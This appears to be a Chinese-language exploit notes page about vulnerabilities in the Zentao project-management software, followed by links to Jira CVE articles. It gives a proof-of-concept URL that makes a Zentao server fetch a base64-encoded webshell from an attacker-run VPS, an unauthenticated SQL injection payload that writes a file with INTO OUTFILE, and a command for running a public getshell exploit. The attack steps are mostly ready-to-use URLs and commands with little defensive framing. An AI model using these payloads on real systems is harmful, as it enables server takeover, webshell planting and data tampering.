---
title: Zentao(禅道)
---

## 应用简介

[禅道](https://www.zentao.net/) ，项目管理软件

## [CNVD-C-2020-121325]-文件上传

**漏洞概述**
```http
#影响范围
Zentao <= 12.4.2 开源版
```

由于开发者对link参数过滤不严，导致攻击者对下载链接可控，导致可远程下载服务器恶意脚本文件，造成任意代码执行，获取webshell

**漏洞利用**

POC

```bash
http://127.0.0.1/zentao/client-download-1-<base64 encode webshell download link>-1.html

http://127.0.0.1/zentao/data/client/1/<download link filename>

#这里需要自己开启一个VPS提供下载服务，然后把链接的base64位编码和自己的路径替换一下。
http://127.0.0.1/zentaopms/www/client-download-1-<base64 encode webshell download link>-1.html
```

上传位置`zentaopms\www\data\client\1`

## 免登录SQL注入

```http
#影响版本
Zentao 9.1.2
```

**漏洞利用**

```http
http://zentao.me/block-main.html?mode=getblockdata&blockid=case¶m=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtzZWxlY3QgMTIzIGludG8gb3V0ZmlsZSAnZDoveHh4LnR4dCctLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ
```

解码之后如下，因为可以PDO可以多语句，那么就可以update或者写文件操作

```http
{"orderBy":"order limit 1;select 123 into outfile 'd:/xxx.txt'-- -","num":"1,1","type":"openedbyme"}
```

## 前台Getshell

```http
#影响版本
8.2 - 9.2.1
```

**漏洞利用**

EXP：https://github.com/jas502n/zentao-getshell

```bash
python exp.py http://127.0.0.1:81/ jas502n.php`
```

## 另一个项目管理软件Jira

🔸 [Jira服务工作台路径遍历导致的敏感信息泄露漏洞（CVE-2019-14994）](https://cloud.tencent.com/developer/article/1529135)
🔸 [Jira未授权SSRF漏洞(CVE-2019-8451)](https://www.cnblogs.com/backlion/p/11608371.html)
🔸 [Atlassian JIRA服务器模板注入漏洞（CVE-2019-11581）](https://www.cnblogs.com/backlion/p/11608439.html)
🔸 [CVE-2019-8449 JIRA 信息泄漏漏洞](https://xz.aliyun.com/t/7219)